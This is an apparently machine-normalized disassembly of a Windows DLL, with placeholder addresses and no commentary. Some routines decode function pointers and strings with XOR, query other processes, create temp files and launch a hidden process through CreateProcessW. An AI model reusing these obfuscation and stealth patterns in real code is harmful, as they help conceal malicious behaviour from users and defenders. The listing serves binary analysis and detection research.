mov [ ebp - 0x244 ] ebx
mov [ ebp - 0x240 ] ebx
call sub_100304d0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x244 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x238 ]
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea esi [ ebp - 0x23c ]
call sub_10018d10
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov esi [ ebp - 0x23c ]
call sub_10050f70
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
mov eax esi
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0x4
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ecx esi
call sub_10026970
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0x5
jmp r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov ecx esi
call sub_10010ed0
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0x6
jmp r-xdata
mov ecx esi
call sub_1003dd40
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0x7
jmp r-xdata
mov eax esi
call sub_100339d0
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0x8
jmp r-xdata
lea ecx [ ebp - 0x23c ]
call sub_1003b980
test eax eax
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0x9
jmp r-xdata
mov ebx [ ebp - 0x23c ]
lea esi [ ebp - 0x234 ]
mov edx ebx
call sub_10017f10
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_10036380
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10029c40
mov esi r--data
mov ecx rw-data
call sub_1005ee60
test al al
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0xb
jmp r-xdata
mov esi r--data
mov ecx rw-data
call sub_1005ee60
test al al
je r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0xc
jmp r-xdata
push rw-data
mov edx ebx
mov ecx rw-data
call sub_1002f0c0
add esp 0x4
test eax eax
je r-xdata
lea esi [ ebp - 0x234 ]
mov edx ebx
call sub_10004f00
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_10036380
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10029c40
mov esi r--data
mov ecx rw-data
call sub_1005ee60
test al al
je r-xdata
call sub_1005dd20
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10044190
xor eax eax
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0xe
jmp r-xdata
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x4 ] 0x1
call sub_10044190
lea eax [ ebp - 0x23c ]
mov [ ebp - 0x4 ] edi
call sub_10044190
mov eax 0xd
jmp r-xdata
sub_10025c79
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_100680f5
call sub_100680f5
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_10025cf0
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
lea ebx [ esi + 0x4c ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0x68 ]
lea ecx [ ebp + 0x8 ]
cmp ecx eax
jae r-xdata
cmp eax [ esi + 0x6c ]
jne r-xdata
mov ecx [ esi + 0x64 ]
lea edx [ ebp + 0x8 ]
cmp ecx edx
ja r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
lea eax [ esi + 0x64 ]
call sub_10020b00
push edi
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x6c ]
jne r-xdata
add [ esi + 0x68 ] 0x4
push ebx
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
lea eax [ esi + 0x64 ]
call sub_10020b00
add [ esi + 0x68 ] 0x4
pop edi
push ebx
call [ LeaveCriticalSection@IAT ]
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ esi + 0x64 ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
sub_10025d80
push ebp
mov ebp esp
sub esp 0xb10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
test eax eax
jne r-xdata
push eax
call [ StrToIntW@IAT ]
mov edi eax
push edi
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x104
lea eax [ ebp - 0x28c ]
push eax
push 0x0
push esi
call [ GetModuleFileNameExW@IAT ]
test eax eax
push esi
mov al 0x38
jne r-xdata
lea eax [ esi + 0x2 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
mov [ ebp - 0xab0 ] edx
xor [ ebp - 0xab0 ] al
xor [ ebp - 0xaaf ] al
xor [ ebp - 0xaae ] al
xor [ ebp - 0xaad ] al
call [ ebp - 0xab0 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0xab0 ] ecx
xor [ ebp - 0xab0 ] al
xor [ ebp - 0xaaf ] al
xor [ ebp - 0xaae ] al
xor [ ebp - 0xaad ] al
call [ ebp - 0xab0 ]
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28c ]
push eax
call [ PathQuoteSpacesW@IAT ]
lea edx [ ebp - 0x7c ]
mov eax 0xad
call sub_10013830
mov ecx edx
push ecx
mov edx 0x7ffffffe
mov eax 0x30c
lea ecx [ ebp - 0x8a4 ]
call sub_1006c8f0
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax 0x6e
call sub_10013830
push edi
push edx
mov eax 0x16
lea ebx [ ebp - 0x4c ]
call sub_10034360
add esp 0x8
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x4c ]
push eax
lea esi [ ebp - 0x8a4 ]
call sub_100658c0
test eax eax
je r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x74 ]
mov eax 0xcb
call sub_10013830
mov ecx edx
push ecx
lea esi [ ebp - 0x8a4 ]
call sub_100658c0
test eax eax
je r-xdata
mov eax 0x7
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x28c ]
push edx
lea esi [ ebp - 0x8a4 ]
call sub_100658c0
test eax eax
je r-xdata
mov eax 0x8
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x20 ]
mov eax 0x6a
call sub_10013830
mov eax edx
push eax
lea esi [ ebp - 0x8a4 ]
call sub_100658c0
test eax eax
je r-xdata
mov eax 0x9
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x34 ]
mov eax 0xcd
call sub_10013830
push 0x104
lea ecx [ ebp - 0xaac ]
push ecx
push edx
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
jne r-xdata
mov eax 0xa
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push 0x44
lea eax [ ebp - 0xb0c ]
push 0x0
push eax
call sub_10079a10
add esp 0xc
xor eax eax
lea ecx [ ebp - 0xac0 ]
push ecx
lea edx [ ebp - 0xb0c ]
push edx
push eax
push eax
push 0x8000000
push eax
push eax
push eax
mov [ ebp - 0xac0 ] eax
mov [ ebp - 0xabc ] eax
mov [ ebp - 0xab8 ] eax
mov [ ebp - 0xab4 ] eax
lea eax [ ebp - 0x8a4 ]
push eax
lea ecx [ ebp - 0xaac ]
push ecx
mov [ ebp - 0xb0c ] 0x44
call [ CreateProcessW@IAT ]
mov ecx [ ebp - 0x8 ]
neg eax
sbb eax eax
pop edi
and eax 0xfffffff4
pop esi
xor ecx ebp
add eax 0xc
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0xb
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10026080
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
push ebx
mov ebx [ LocalFree@IAT ]
push edi
lea esp [ esp ]
mov edx [ esi ]
push edx
call ebx
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esi ]
mov edi [ eax ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
test edi edi
je r-xdata
pop edi
pop ebx
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ edi + 0x10 ] 0x0
je r-xdata
push eax
call ebx
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
mov [ edi + 0x10 ] 0x0
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ edi + 0x50 ] 0x0
je r-xdata
push eax
call ebx
cmp [ edi + 0x54 ] 0x0
lea esi [ edi + 0x54 ]
je r-xdata
mov [ edi + 0x50 ] 0x0
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ ebp + 0x8 ]
call sub_10024550
sub_10026140
push ebp
mov ebp esp
sub esp 0x690
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x684 ] ecx
mov [ ebp - 0x68c ] edx
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
test edx edx
je r-xdata
xor ecx ecx
test eax eax
setne cl
push ebx
push edi
lea edx [ ebp - 0x688 ]
mov eax 0x2
add ecx 0x80000001
mov [ ebp - 0x690 ] ecx
call sub_1006a280
lea edx [ ebp - 0x680 ]
mov eax 0x5
call sub_1006a280
lea edx [ ebp - 0x67c ]
mov eax 0x3
call sub_1006a280
mov edi [ StrStrW@IAT ]
push edx
push esi
call edi
lea ecx [ ebp - 0x678 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
jmp r-xdata
lea ebx [ ebp - 0x680 ]
xor edi edi
sub ebx ecx
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ edx + 0x2 ]
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x67c ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop ebx
lea eax [ edx + 0x5 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
jmp r-xdata
lea eax [ ebp - 0x680 ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x684 ]
lea ecx [ ebp - 0x67c ]
push ecx
push edx
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edi [ StrStrW@IAT ]
pop edi
pop ebx
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x684 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ ebp - 0x680 ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
je r-xdata
mov eax [ ebp - 0x684 ]
lea edx [ ebp - 0x67c ]
push edx
push eax
call edi
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x688 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
je r-xdata
lea ecx [ ebp - 0x680 ]
push ecx
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
je r-xdata
lea eax [ ebp - 0x67c ]
push eax
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
lea ebx [ ebp - 0x678 ]
call sub_1003d910
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x60 ]
mov eax 0x1
call sub_1006a280
mov edx [ ebp - 0x68c ]
push 0x1
push edx
mov edx [ ebp - 0x690 ]
lea ecx [ ebp - 0x678 ]
lea eax [ ebp - 0x60 ]
call sub_10016580
add esp 0x8
test eax eax
je r-xdata
pop edi
pop ebx
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop ebx
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop ebx
mov eax 0xd
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_100264c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080570
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_10055606
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10026580
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x110 ]
push eax
push 0x104
xor esi esi
call [ GetTempPathA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
mov esi [ r--data ]
xor cl cl
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x36
inc cl
mov [ ebp + eax - 0xc ] dl
movzx eax cl
cmp eax 0x7
jb r-xdata
mov eax [ edi + 0x37c ]
push ebx
push eax
lea ecx [ eax + 0x1 ]
lea edx [ ebp - 0xc ]
push edx
lea eax [ ebp - 0x110 ]
push eax
mov [ ebp - 0x5 ] 0x0
mov [ edi + 0x37c ] ecx
call [ GetTempFileNameA@IAT ]
test eax eax
je r-xdata
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10026630
push ebp
mov ebp esp
mov eax edx
push esi
lea esi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
push eax
push edx
call sub_10025720
pop esi
pop ebp
retn 0x4
sub_10026670
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffbb
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe8
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x14 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd6
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0x9
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x3c ]
xor eax eax
push ecx
mov [ ebp - 0x2a ] ax
call esi
lea edx [ ebp - 0x28 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_100796a0
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_100796a0
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x28 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_100796a0
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_100796a0
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x3c ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_100796a0
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10026810
push ecx
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
push eax
mov edx ebx
mov ecx esi
mov [ esi + 0x54 ] edi
call sub_1002f4c0
mov [ esi + 0x4 ] 0x2
cmp [ ebx + 0x20 ] 0x8
jb r-xdata
add ebx 0xc
mov ebx [ ebx + 0xc ]
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x14 ] eax
call sub_100796a0
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_100268a0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
add eax eax
add eax eax
push eax
push ecx
call sub_10020380
add esp 0x8
mov [ esi ] eax
pop esi
pop ebp
retn
sub_100268d7
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10026970
push ebp
mov ebp esp
push 0xffffffff
push sub_1008044c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x13c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov esi ecx
mov [ ebp - 0x144 ] esi
mov [ ebp - 0x128 ] ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x138 ] ebx
mov [ ebp - 0x134 ] ebx
mov [ ebp - 0x130 ] ebx
mov [ ebp - 0x12c ] ebx
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x13c ] ebx
mov [ ebp - 0x4 ] 0x3
cmp esi ebx
jne r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x54
call sub_10013830
push esi
lea edx [ ebp - 0x128 ]
lea ecx [ ebp - 0x4c ]
call sub_1005a590
test eax eax
je r-xdata
lea esi [ ebp - 0x140 ]
call sub_10005940
lea esi [ ebp - 0x130 ]
call sub_10005940
lea esi [ ebp - 0x138 ]
call sub_10005940
lea esi [ ebp - 0x128 ]
call sub_10005940
lea eax [ ebx + 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x128 ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_10005940
lea esi [ ebp - 0x130 ]
call sub_10005940
lea esi [ ebp - 0x138 ]
call sub_10005940
lea esi [ ebp - 0x128 ]
call sub_10005940
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0x13f
call sub_10013830
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x138 ]
lea ecx [ ebp - 0x90 ]
call sub_1005a590
test eax eax
je r-xdata
